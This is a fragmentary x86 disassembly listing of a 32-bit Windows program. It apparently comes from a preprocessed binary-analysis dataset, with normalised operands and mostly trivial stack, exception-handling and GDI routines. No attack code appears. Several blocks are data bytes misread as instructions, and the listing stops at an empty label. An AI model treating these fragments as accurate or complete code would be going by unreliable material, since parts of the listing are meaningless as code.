sub_403b2f
mov esp ebp
pop ebp
retn
sub_403bb5
jmp sub_44c770
sub_403bbc
mov esp ebp
pop ebp
retn
sub_403cc8
jmp sub_44c770
sub_403ccf
mov esp ebp
pop ebp
retn
sub_403cd4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x50 ]
pop ecx
pop ebp
retn
sub_403db1
jmp sub_44c770
sub_403db8
pop ebp
retn
sub_403dbc
sub [ rw-data ] 0x1
retn
sub_403f4c
pushfd
retn 0x44
sub_404214
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_404a3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_404a4c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_404a5c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_404a6c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_404a7c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_404a8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_404a9c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_404ab0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_40512d
jmp sub_44c770
sub_405134
pop ebp
retn
sub_405138
sub [ rw-data ] 0x1
retn
sub_40516c
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_4053c8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44cb34
pop ecx
pop ecx
pop ebp
retn
sub_405424
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44d104
pop ecx
pop ecx
pop ebp
retn
sub_4054d2
jmp sub_44c770
sub_4054d9
pop ebx
mov esp ebp
pop ebp
retn
sub_4055a8
fstp [ esi ]
retn
sub_4055ab
fstp [ esi ]
retn
sub_4055ae
fistp [ esi ]
retn
sub_4055b1
fmul [ rw-data ]
fistp [ esi ]
retn
sub_4055d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44d7f0
pop ecx
pop ecx
pop ebp
retn
sub_4056e6
jmp sub_44c770
sub_4056ed
pop ebp
retn
sub_4056f0
sub [ rw-data ] 0x1
retn
sub_40571d
jmp sub_44c770
sub_405724
pop ebp
retn
sub_405728
sub [ rw-data ] 0x1
retn
sub_405761
jmp sub_44c770
sub_405768
pop ebp
retn
sub_40576c
sub [ rw-data ] 0x1
retn
sub_405ad0
pushfd
retn 0x44
sub_405ecc
pushfd
retn 0x44
sub_405fc0
pushfd
retn 0x44
sub_406298
pushfd
retn 0x44
sub_40659c
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_4065d7
jmp [ eax + eax ]
sub_406648
push ebp
mov ebp esp
mov eax [ esp + 0x8 ]
pop ebp
retn
sub_406677
pop ecx
pop ebp
retn
sub_406933
jmp sub_44c770
sub_40693a
mov esp ebp
pop ebp
retn
sub_406abe
jmp sub_44c770
sub_406ac5
mov ax [ ebp - 0x6 ]
mov esp ebp
pop ebp
retn
sub_4074fd
jmp sub_44c770
sub_407504
pop ebx
mov esp ebp
pop ebp
retn
sub_407616
jmp sub_44c770
sub_40761d
mov esp ebp
pop ebp
retn
sub_407ac1
jmp sub_44c770
sub_407ac8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_407f19
jmp sub_44c770
sub_4083ab
jmp sub_44c770
sub_4083b2
pop edi
pop esi
pop ecx
pop ebp
retn
sub_4087a6
jmp sub_44c770
sub_408c5d
jmp sub_44c770
sub_408c64
pop edi
pop esi
pop ecx
pop ebp
retn
sub_409075
jmp sub_44c770
sub_40907c
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409087
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_409330
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_40a0e8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax sub_40a0b0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x5c ]
call sub_406b74
pop ecx
pop ebp
retn
sub_40a326
jmp sub_44c770
sub_40a32d
pop ebx
mov esp ebp
pop ebp
retn
sub_40a805
jmp sub_44c770
sub_40a844
jmp sub_44c770
sub_40a84b
mov al [ ebp - 0x1e ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40b110
jmp sub_44c4bc
sub_40b1e3
jmp sub_44c770
sub_40b4fd
jmp sub_44c770
sub_40b87e
jmp sub_44c770
sub_40b885
mov al [ ebp - 0xd ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40be4a
jmp sub_44c4bc
sub_40be4f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4251dc
call sub_44c818
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40c231
jmp sub_44c770
sub_40c238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
call sub_44c070
retn
sub_40c24e
jmp sub_44c770
sub_40c35c
jmp sub_44c770
sub_40c363
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c380
mov eax [ ebp - 0x20 ]
call sub_44c070
retn
sub_40c379
jmp sub_44c770
sub_40c39e
jmp sub_44c770
sub_40c44c
jmp sub_44c770
sub_40c453
mov esp ebp
pop ebp
retn
sub_40caf3
jmp sub_44c770
sub_40cafa
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_40cbfc
jmp sub_44c770
sub_40cc03
pop ebp
retn
sub_40cc68
insb
int3
j_sub_41d1f4
clc
jmp sub_41d1f4
sub_40d398
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_40dba4
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_40dbd4
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_40dc6c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
pop ecx
pop ebp
retn
sub_40dc84
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call LeaveCriticalSection
pop ecx
pop ebp
retn
sub_40dd91
jmp sub_44c770
sub_40dd98
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40de3e
jmp sub_44c770
sub_40dee4
jmp sub_44c770
sub_40deeb
pop ebx
mov esp ebp
pop ebp
retn
sub_40df63
jmp sub_44c770
sub_40df6a
pop ebx
mov esp ebp
pop ebp
retn
sub_40dfee
jmp sub_44c770
sub_40dff5
mov esp ebp
pop ebp
retn
sub_40e0ab
jmp sub_44c770
sub_40e0b2
mov esp ebp
pop ebp
retn
sub_40e941
jmp sub_44c770
sub_40e948
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40e4d4
retn
sub_40e95e
jmp sub_44c770
sub_40e9ec
jmp sub_44c770
sub_40e9f3
pop ecx
pop ecx
pop ebp
retn
sub_40eb91
jmp sub_44c770
sub_40ebbc
jmp sub_44c770
sub_40ebc3
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40ef15
jmp sub_44c770
sub_40ef1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40e4d4
retn
sub_40ef32
jmp sub_44c770
sub_40efc0
jmp sub_44c770
sub_40efc7
pop ecx
pop ecx
pop ebp
retn
sub_40f0a0
jmp sub_44c770
sub_40f277
jmp sub_44c770
sub_40f27e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40e4d4
retn
sub_40f294
jmp sub_44c770
sub_40f32c
jmp sub_44c770
sub_40f333
pop ecx
pop ecx
pop ebp
retn
sub_40f49d
jmp sub_44c770
sub_40faaa
jmp sub_44c770
sub_40fab1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_40fce4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_410008
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
pop ecx
pop ebp
retn
sub_410028
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
pop ecx
pop ebp
retn
sub_410054
mov eax [ rw-data ]
call sub_410028
retn
sub_4100b6
jmp sub_44c770
sub_4100bd
pop ecx
pop ebp
retn
sub_410161
jmp sub_44c770
sub_410168
mov esp ebp
pop ebp
retn
sub_41024f
jmp sub_44c770
sub_4102ec
jmp sub_44c770
sub_4102f3
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_410448
jmp sub_44c770
sub_410631
jmp sub_44c770
sub_410638
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x28
sub_4108ca
jmp sub_44c770
sub_4108d1
lea eax [ ebp - 0x418 ]
push eax
call CreatePalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41097f
jmp sub_44c770
sub_410bab
jmp sub_44c770
sub_410c6d
jmp sub_44c770
sub_410c74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c94
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
retn
sub_410c8d
jmp sub_44c770
sub_410c94
mov esp ebp
pop ebp
retn 0x4
sub_410e65
jmp sub_44c770
sub_411069
jmp sub_44c770
sub_411070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411093
mov eax [ ebp - 0x5c ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_44ba74
retn
sub_41108c
jmp sub_44c770
sub_411093
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4110b3
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_44ba74
retn
sub_4110ac
jmp sub_44c770
sub_4110b3
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_411379
jmp sub_44c770
sub_411380
mov al [ ebp - 0xd ]
mov esp ebp
pop ebp
retn 0x8
sub_4113bc
retn
sub_4113c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
call sub_4113bc
sub_4115be
jmp sub_44c770
sub_4115e5
jmp sub_44c770
sub_4115ec
pop ebx
mov esp ebp
pop ebp
retn
sub_411836
jmp sub_44c770
sub_41183d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_44c070
retn
sub_411853
jmp sub_44c770
sub_411864
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41187c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x19 ]
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_4118e7
jmp sub_44c770
sub_4118ee
mov esp ebp
pop ebp
retn
sub_4119a2
jmp sub_44c770
sub_4119a9
mov esp ebp
pop ebp
retn
sub_4119b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_411b8c
jmp sub_44c770
sub_411b93
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_411ce1
jmp sub_44c770
sub_411ce8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411d7e
jmp sub_44c770
sub_411d85
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_411e1c
mov al [ 0xffffffffa40044c2 ]
retn 0x44
sub_411f67
jmp sub_44c4bc
sub_4121ba
jmp sub_44c4bc
sub_4123c2
jmp sub_44c4bc
sub_41244e
jmp sub_44c770
sub_412455
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41265c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_412880
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
sete [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_412c82
jmp sub_44c770
sub_412c89
mov esp ebp
pop ebp
retn
sub_412e23
jmp sub_44c770
sub_412e2a
pop ebx
mov esp ebp
pop ebp
retn
sub_412eb6
jmp sub_44c770
sub_412ebd
mov esp ebp
pop ebp
retn
sub_413060
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_413370
jmp sub_44c770
sub_4134b6
jmp sub_44c770
sub_4134bd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4134d6
jmp sub_44c770
sub_4136e6
jmp sub_44c770
sub_41370e
jmp sub_44c770
sub_413715
mov esp ebp
pop ebp
retn
sub_4137aa
jmp sub_44c770
sub_4138e9
jmp sub_44c770
sub_4139f4
jmp sub_44c770
sub_413a00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x4 ]
pop ecx
pop ebp
retn
sub_413bff
jmp sub_44c770
sub_413fcf
jmp sub_44c770
sub_414224
jmp sub_44c770
sub_41424e
jmp sub_44c770
sub_414255
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414277
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
retn
sub_414270
jmp sub_44c770
sub_414281
jmp sub_44c4bc
sub_4142d0
jmp sub_44c770
sub_41452f
jmp sub_44c770
sub_414577
jmp sub_44c770
sub_41471d
jmp sub_44c770
sub_4147f7
jmp sub_44c4bc
sub_414abb
jmp sub_44c770
sub_414b3f
jmp sub_44c770
sub_414b46
pop ebx
mov esp ebp
pop ebp
retn
sub_4153b3
jmp sub_44c4bc
sub_415419
jmp sub_44c770
sub_415420
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_415818
jmp sub_44c770
sub_415844
jmp sub_44c770
sub_4158ac
jmp sub_44c4bc
sub_4158dd
jmp sub_44c770
sub_415962
jmp sub_44c4bc
sub_415967
mov eax [ ebp - 0x3c ]
call sub_44c070
call sub_44c7c4
call sub_44c818
sub_415979
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415996
mov eax [ ebp - 0x1c ]
call sub_44ba74
retn
sub_41598f
jmp sub_44c770
sub_415b0f
jmp sub_44c4bc
sub_415ee1
jmp sub_44c4bc
sub_41608a
jmp sub_44c770
sub_416543
jmp sub_44c4bc
sub_416548
mov eax [ ebp - 0xc ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_44c7c4
call sub_44c818
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41691c
jmp sub_44c4bc
sub_4169d9
jmp sub_44c4bc
sub_416a4f
jmp sub_44c4bc
sub_416ae8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_416b68
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_410008
mov esp ebp
pop ebp
retn 0x4
sub_416b88
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_410008
mov esp ebp
pop ebp
retn 0x4
sub_416d94
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call EnterCriticalSection
pop ecx
pop ebp
retn
sub_416dac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call LeaveCriticalSection
pop ecx
pop ebp
retn
sub_416e81
jmp sub_44c770
sub_416e88
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_416f8d
jmp sub_44c4bc
sub_417001
jmp sub_44c770
sub_417145
jmp sub_44c770
sub_41714c
pop ebp
retn
sub_4177cc
add [ eax ] bl
add al [ eax ]
sub_41857a
add dh bh
mov al [ 0x42cb ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
add [ ecx ] 0x8
add al [ eax ]
[ eax - 0x3e ]
sub_419e3c
pushfd
retn 0x44
sub_419ef4
pushfd
retn 0x44
sub_41a120
jmp sub_44c4bc
sub_41a157
jmp sub_44c770
sub_41a15e
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a3cc
retn
sub_41a793
jmp sub_44c770
sub_41a79a
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41a85f
jmp sub_44c770
sub_41a866
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41ba05
jmp sub_44c770
sub_41ba0c
mov esp ebp
pop ebp
retn
sub_41bbd3
jmp sub_44c770
sub_41bedc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_41bf65
jmp sub_44c770
sub_41bfa4
jmp sub_44c770
sub_41c155
jmp sub_44c770
sub_41c15c
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_41a9ac
mov eax [ ebp - 0x4 ]
call sub_41bae8
sub_41c3ec
jmp sub_44c770
sub_41c3f3
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41c7a2
jmp sub_44c770
sub_41c7da
jmp sub_44c770
sub_41c7e1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c801
lea eax [ ebp - 0x118 ]
call sub_44cae0
retn
sub_41c7fa
jmp sub_44c770
sub_41c801
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_41cb62
jmp sub_44c770
sub_41cb69
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_41cbbd
jmp sub_44c4bc
sub_41cc31
jmp sub_44c4bc
sub_41cc36
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4251dc
call sub_44c818
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41d03b
jmp sub_44c770
sub_41d042
mov esp ebp
pop ebp
retn
sub_41d1d7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_41d1f4
hlt
sub_41d7e4
jmp sub_44c770
sub_41d7eb
pop ecx
pop ecx
pop ebp
retn
sub_41d7f0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
sub_41db3f
jmp sub_44c770
sub_41db46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_44c070
retn
sub_41db5c
jmp sub_44c770
sub_41dc59
jmp sub_44c770
sub_41dc60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc7d
mov eax [ ebp - 0x18 ]
call sub_44c070
retn
sub_41dc76
jmp sub_44c770
sub_41dc9d
jmp sub_44c770
sub_41dfc7
jmp sub_44c770
sub_41e3f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41e873
jmp sub_44c770
sub_41e87a
pop ebx
mov esp ebp
pop ebp
retn
sub_41e938
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
setne [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_41f43b
jmp sub_44c770
sub_41f442
mov esp ebp
pop ebp
retn
sub_41f5fa
jmp sub_44c770
sub_41f601
pop ebx
mov esp ebp
pop ebp
retn
sub_41f999
jmp sub_44c770
sub_41f9a0
mov eax [ rw-data ]
call sub_422848
mov [ ebp - 0x9 ] 0x1
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41f9ba
add [ eax ] al
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
pop ecx
pop ebp
retn
sub_41fddd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
xor edx edx
call sub_40fcf0
retn
sub_41fdee
jmp sub_44c770
j_sub_41fddd
jmp sub_41fddd
sub_41fdf5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_40fab8
retn
sub_41fe11
jmp sub_44c770
sub_41fe18
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42044f
jmp sub_44c770
sub_420456
mov esp ebp
pop ebp
retn
sub_4204e8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42135c
pop ecx
pop ecx
pop ebp
retn
sub_420b00
jmp sub_44c770
sub_420b07
mov esp ebp
pop ebp
retn
sub_420d03
jmp sub_44c4bc
sub_4210ec
jmp sub_44c4bc
sub_4211ee
jmp sub_44c770
sub_4211f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421212
lea eax [ ebp - 0x1c ]
call sub_44cae0
retn
sub_42120b
jmp sub_44c770
sub_421212
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421248
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c070
pop ecx
pop ecx
pop ebp
retn
sub_42134e
jmp sub_44c770
sub_42151b
jmp sub_44c4bc
sub_421544
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d71c
pop ecx
pop ebp
retn
sub_421558
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41d71c
mov eax [ ebp - 0x4 ]
call sub_42cdec
pop ecx
pop ebp
retn
sub_4215f0
jmp sub_44c770
sub_4215f7
pop ecx
pop ecx
pop ebp
retn
sub_4217f7
jmp sub_44c770
sub_4218a3
jmp sub_44c770
sub_4218ad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218ca
lea eax [ ebp - 0x20 ]
call sub_44cae0
retn
sub_4218c3
jmp sub_44c770
sub_4218ca
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_421fd1
jmp sub_44c770
sub_421fd8
pop ebx
mov esp ebp
pop ebp
retn
sub_4222f6
jmp sub_44c770
sub_4222fd
mov esp ebp
pop ebp
retn
sub_422c3b
jmp sub_44c770
sub_422c87
jmp sub_44c770
sub_422c8e
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_422d04
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_425908
pop ecx
pop ecx
pop ebp
retn
sub_422f44
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x80 ]
pop ecx
pop ebp
retn
sub_422f90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4234b0
pop ecx
pop ebp
retn
sub_4234a2
jmp sub_44c770
sub_42352a
jmp sub_44c770
sub_423538
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x24
call sub_448fa8
pop ecx
pop ebp
retn
sub_423611
jmp sub_44c4bc
sub_423616
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4251dc
call sub_44c818
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_423d3d
jmp sub_44c770
sub_423d44
mov esp ebp
pop ebp
retn
sub_423f38
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_423e6c
pop ecx
pop ebp
retn
sub_423f4c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_423e6c
pop ecx
pop ebp
retn
sub_4247d2
jmp sub_44c4bc
sub_424ba2
jmp sub_44c770
sub_424ba9
mov esp ebp
pop ebp
retn
sub_4250b1
jmp sub_44c4bc
sub_4251b6
jmp sub_44c770
sub_4251bd
pop ecx
pop ebp
retn
sub_4251c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
call sub_448ce8
test al al
je r-xdata
pop ecx
pop ebp
retn
push 0x0
call PostQuitMessage
sub_4253c3
jmp sub_44c770
sub_4253ca
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x4
sub_425494
jmp sub_44c770
sub_42549b
mov esp ebp
pop ebp
retn
sub_4258bd
jmp sub_44c4bc
sub_4258f8
jmp sub_44c770
sub_4258ff
